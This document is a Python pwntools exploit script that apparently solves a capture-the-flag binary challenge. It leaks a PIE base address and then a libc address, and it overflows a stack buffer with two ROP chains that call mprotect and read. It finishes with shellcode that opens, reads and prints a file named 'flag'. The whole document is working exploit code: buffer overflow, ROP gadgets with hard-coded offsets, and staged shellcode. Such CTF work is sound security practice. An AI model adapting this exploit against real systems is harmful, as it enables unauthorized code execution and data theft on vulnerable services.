from pwn import *
from time import sleep

e = context.binary = ELF("./chal_patched")
l = ELF("./libc.so.6")
gs = """
b *menu+101
"""


def start():
    if args.LOCAL:
        p = e.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


r = start()

r.recvuntil(b'0x')
e.address = int(r.recv(12), 16) - e.sym.greeting
log.info(f'PIE: {hex(e.address)}')
r.recvuntil(b'today?\n')
ret = 0x000000000000101a + e.address
bss = e.bss()+0x400
pl = b'A' * 0xd0
pl += p64(bss)  # rbp
pl += p64(ret)
pl += p64(e.plt.printf)
pl += p64(e.plt.puts)
pl += p64(e.sym.menu + 45)
sleep(0.2)
r.sendline(pl)
r.recvuntil(b'way!\n')
l = ELF("./libc.so.6")
l.address = u64(r.recv(6) + b'\0' * 2) - l.sym.funlockfile
log.info(f'Libc: {hex(l.address)}')
rdi = 0x000000000002a3e5 + l.address
rsi = l.address + 0x2be51
rdx_r12 = l.address + 0x000000000011f2e7
l_bss = l.address + 0x21c000
pl = b'A' * 0xd0
pl += p64(0)
pl += p64(rdi) + p64(l_bss) + p64(rsi) + p64(0x3000) + \
    p64(rdx_r12) + p64(7) * 2 + p64(l.sym.mprotect)
pl += p64(rdi) + p64(0) + p64(rsi) + p64(l_bss + 0x100) + \
    p64(rdx_r12) + p64(0x2000) * 2 + p64(l.sym.read)
pl += p64(l_bss + 0x100)
sleep(0.2)
r.send(pl)
shellcode = asm(f"""

    mov eax, 437
    mov edi, -100
    lea rsi, [rip + path_flag]
    lea rdx, [rip + how]
    mov r10, 24
    syscall
                
    mov edi, eax
    mov rsi, rsp
    mov rdx, 100
    mov eax, 0
    syscall

    mov eax, 1
    mov edi, 1
    syscall            
    
    

path_flag:
  .asciz "flag"
how:
    .long 0
    .long 0
    .long 0
    .long 0                 


""")
pause()
r.send(shellcode)
r.interactive()
